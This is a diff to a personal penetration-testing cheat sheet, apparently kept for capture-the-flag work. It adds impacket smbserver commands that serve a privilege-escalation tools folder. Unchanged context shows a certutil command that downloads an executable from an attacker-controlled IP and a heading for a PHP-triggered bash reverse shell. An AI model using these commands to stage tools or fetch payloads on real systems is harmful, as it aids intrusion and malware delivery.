@@ -1,4 +1,4 @@
-in here is things i have copy pasted since i have to look for them way too often
+in here is things i have copy pasted since i have to look for them way too often, i take no credit for anything btw
 
 ### bash reverse shell from a php command thing
 
@@ -27,4 +27,18 @@ stolen from ired.team. i forgor this one way too much aswell
 
 ```powershell
 certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+```
+
+### smberver commands
+
+```bash
+
+# accept specific auth
+smbserver.py -smb2support <SHARENAME> <LOCALPATH> -username <USERNAME> -password <PASSWORD>
+smbsever.py -smb2support POSTEXP /home/tobeatelite/ctf/tools/privesc -username tbe -password tbe
+
+# anon access
+smbserver.py <SHARENAME> <LOCALPATH>
+smbserver.py POSTEXP /home/tobeatelite/ctf/tools/privesc
+
 ```
